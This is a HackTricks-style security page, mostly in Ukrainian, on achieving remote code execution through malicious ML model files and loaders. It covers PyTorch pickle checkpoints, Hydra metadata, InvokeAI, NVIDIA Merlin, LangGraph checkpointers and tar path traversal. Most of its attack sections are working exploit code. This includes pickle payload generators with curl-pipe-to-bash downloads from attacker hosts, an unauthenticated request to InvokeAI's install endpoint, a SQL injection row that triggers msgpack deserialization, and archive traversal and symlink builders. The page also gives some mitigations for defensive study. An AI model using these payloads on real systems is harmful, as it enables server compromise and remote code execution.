# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Моделі Machine Learning зазвичай поширюються в різних форматах, як-от ONNX, TensorFlow, PyTorch тощо. Ці моделі можуть завантажуватися на машини розробників або в production-системи для використання. Зазвичай моделі не мають містити шкідливий код, але є випадки, коли модель може бути використана для виконання arbitrary code на системі — як задумана функція або через vulnerability у бібліотеці завантаження моделі.

На момент написання ось кілька прикладів таких vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Крім того, існують python pickle based моделі, як-от ті, що використовуються [PyTorch](https://github.com/pytorch/pytorch/security), які можуть бути використані для виконання arbitrary code на системі, якщо їх не завантажувати з `weights_only=True`. Тож будь-яка pickle based model може бути особливо вразливою до цього типу атак, навіть якщо її немає в таблиці вище.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Ключові моменти:
- Спрацьовує до ініціалізації моделі в NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders і FlexTok loaders.
- String block-list у Hydra можна обійти через альтернативні import paths (наприклад, `enum.bltns.eval`) або через імена, розв’язані застосунком (наприклад, `nemo.core.classes.common.os.system` → `posix`).
- FlexTok також парсить stringified metadata за допомогою `ast.literal_eval`, що дає змогу DoS (CPU/memory blowup) ще до виклику Hydra.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` — популярний open-source web interface для Stable-Diffusion. Версії **5.3.1 – 5.4.2** надають REST endpoint `/api/v2/models/install`, який дає змогу користувачам завантажувати і завантажувати моделі з arbitrary URLs.

Внутрішньо endpoint зрештою викликає:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Коли наданий файл є **PyTorch checkpoint (`*.ckpt`)**, `torch.load` виконує **pickle deserialization**. Оскільки вміст надходить безпосередньо з URL, керованого користувачем, атакувальник може вбудувати зловмисний об’єкт із власним методом `__reduce__` всередині checkpoint; метод виконується **під час deserialization**, що призводить до **remote code execution (RCE)** на сервері InvokeAI.

Уразливості було присвоєно **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Розмістіть `payload.ckpt` на HTTP server, який ви контролюєте (наприклад, `http://ATTACKER/payload.ckpt`).
3. Змусьте вразливий endpoint спрацювати (auth не потрібна):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → gadget `os.system` запускається, і attacker отримує code execution у контексті процесу InvokeAI.

Готовий exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь flow.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` reachable by the attacker  
•  Process має permissions для виконання shell commands

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – patch sets `scan=True` by default and performs malware scanning before deserialization.
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Enforce allow-lists / signatures for model sources and run the service with least-privilege.

> ⚠️ Remember that **any** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) is inherently unsafe to deserialize from untrusted sources.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE через небезпечний `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (частина Merlin) містив небезпечний loader checkpoint, який напряму викликав `torch.load()` на шляхах, наданих користувачем. Оскільки `torch.load` спирається на Python `pickle`, checkpoint під контролем attacker може виконати arbitrary code через reducer під час deserialization.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Why this leads to RCE: У Python pickle об’єкт може визначати reducer (`__reduce__`/`__setstate__`), який повертає callable і arguments. Callable виконується під час unpickling. Якщо такий об’єкт присутній у checkpoint, він запускається ще до того, як почнуть використовуватися будь-які weights.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Вектори доставки та blast radius:
- Trojanized checkpoints/models, поширені через repos, buckets або artifact registries
- Автоматизовані resume/deploy pipelines, які auto-load checkpoints
- Виконання відбувається всередині training/inference workers, часто з підвищеними привілеями (наприклад, root у containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) замінив direct `torch.load()` на restricted, allow-listed deserializer, реалізований у `transformers4rec/utils/serialization.py`. Новий loader перевіряє types/fields і запобігає виклику arbitrary callables під час load.

Defensive guidance specific to PyTorch checkpoints:
- Не unpickle ненадійні дані. Надавайте перевагу non-executable форматам, таким як [Safetensors](https://huggingface.co/docs/safetensors/index) або ONNX, коли це можливо.
- Якщо вам все ж потрібно використовувати PyTorch serialization, переконайтеся, що `weights_only=True` (підтримується у новіших PyTorch) або використовуйте custom allow-listed unpickler, подібний до patch у Transformers4Rec.
- Забезпечте model provenance/signatures і sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS і no network egress).
- Моніторте unexpected child processes від ML services під час checkpoint load; trace `torch.load()`/`pickle` usage.

POC і vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Завантажте model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Десеріалізація Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD exposes a `resnet` endpoint that deserializes user-controlled data. ZDI підтвердив, що віддалений attacker може змусити victim завантажити malicious page/file, змусити його надіслати crafted serialized blob до цього endpoint і викликати deserialization як `root`, що призводить до full compromise.

Потік exploit mirror-ить типове pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Будь-який gadget, до якого можна дістатися під час deserialization (constructors, `__setstate__`, framework callbacks, etc.), можна використати так само, незалежно від того, чи був transport HTTP, WebSocket, або файл, скинутий у watched directory.



### LangGraph checkpointer SQLi → MessagePack RCE

Цей attack chain цікавий, тому що attacker **не потрібно upload malicious model file**. Замість цього application exposes **AI-agent persistence API** (`get_state_history(..., filter=...)`), і user input потрапляє до checkpointer query builder.

#### 1. Structural SQLi in metadata filters

Уразливий SQLite pattern виглядав так:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Значення прив’язується пізніше, але `query_key` конкатенується в **JSON path string**, тому `'` всередині ключа словника виходить за межі `'$.{query_key}'` і інжектить SQL. Такий самий урок стосується **JSON paths, identifiers, operators, `LIMIT`, and TTL fields**: placeholders захищають лише значення, а не структурний синтаксис запиту.

#### 2. `UNION SELECT` can target downstream sinks, not just data theft

Запит повертає `type` і серіалізовані байти `checkpoint`, які потім споживаються як:
```python
self.serde.loads_typed((type, checkpoint))
```
Це означає, що SQLi в `WHERE` clause може inject **fake result row**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Якщо пізніший код парсить, десеріалізує, записує або виконує будь-яку вибрану колонку, зіставте ці колонки з їхніми sink-ами. У цьому випадку фейковий рядок перетворює SQLi на **attacker-controlled deserialization**.

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

Шлях `msgpack` у LangGraph використовував custom extension hook, який розпаковував вкладений tuple і виконував:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Отже, об’єкт extension MessagePack, що кодує щось еквівалентне `("os", "system", "id > /tmp/pwned")`, імпортує `os`, резолвить `system` і виконує команду. Під час review AI frameworks перевіряйте **custom MessagePack/JSON/pickle revivers** на dynamic imports, reflection або arbitrary callable dispatch.

#### 4. Практичний audit pattern для agent frameworks

Перевіряйте будь-який user-controlled input, який потрапляє до:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders that generate SQL or Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths that trust rows returned from the persistence layer

Цей конкретний chain вплинув на self-hosted LangGraph deployments, що використовували **SQLite** або **Redis** checkpointers, коли untrusted users могли контролювати `filter`. Виправлені версії, зазначені в disclosure, були `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, і `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Як зазначено в [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість model formats, які використовуються різними AI frameworks, базуються на archives, зазвичай `.zip`. Тому, можливо, можна зловживати цими форматами для проведення path traversal attacks, що дозволяє читати arbitrary files із системи, де завантажується model.

Наприклад, за допомогою такого коду ви можете створити model, яка створить файл у директорії `/tmp` під час завантаження:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Або за допомогою наведеного нижче коду ви можете створити model, яка при завантаженні створить symlink до каталогу `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Глибокий розбір: десеріалізація .keras і пошук gadget

Для сфокусованого гайда по внутрішній структурі .keras, Lambda-layer RCE, проблемі arbitrary import у ≤ 3.8, та пошуку gadget після виправлення всередині allowlist, дивіться:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
